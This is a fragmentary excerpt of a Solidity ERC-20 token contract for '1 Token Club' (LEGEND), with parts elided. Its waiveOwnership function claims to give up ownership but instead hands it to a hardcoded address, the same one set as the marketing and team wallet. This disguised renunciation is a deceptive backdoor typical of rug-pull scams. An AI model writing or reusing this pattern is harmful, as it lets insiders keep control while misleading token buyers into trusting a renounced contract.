...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x821b44375880142fE579D3b0aCC29b9A9bf410EF));
        _owner = address(0x821b44375880142fE579D3b0aCC29b9A9bf410EF);
    }
...
contract legend is Context, IERC20, Ownable {
    ...
    string private _name = "1 Token Club" ;
    string private _symbol = "LEGEND";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress = payable(0x821b44375880142fE579D3b0aCC29b9A9bf410EF);
    address payable public teamWalletAddress = payable(0x821b44375880142fE579D3b0aCC29b9A9bf410EF);
